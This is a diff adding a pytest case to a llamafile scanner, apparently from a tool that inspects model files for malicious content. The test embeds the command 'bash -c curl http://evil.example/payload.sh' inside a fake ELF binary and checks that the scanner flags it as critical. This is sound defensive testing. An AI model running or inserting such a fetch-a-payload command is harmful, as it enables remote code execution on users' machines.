@@ -83,6 +83,22 @@ def test_llamafile_scanner_can_handle_malicious_middle_marker_in_exe(tmp_path: P
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
 
 
+def test_llamafile_scanner_flags_true_middle_runtime_strings(tmp_path: Path) -> None:
+    binary = tmp_path / "middle-runtime.llamafile"
+    binary.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"A" * (2 * 1024 * 1024 + 64)
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+        + b"B" * (2 * 1024 * 1024 + 64)
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
 def test_llamafile_scanner_does_not_route_middle_near_match_in_exe(tmp_path: Path) -> None:
     binary = tmp_path / "middle-near-match.exe"
     binary.write_bytes(
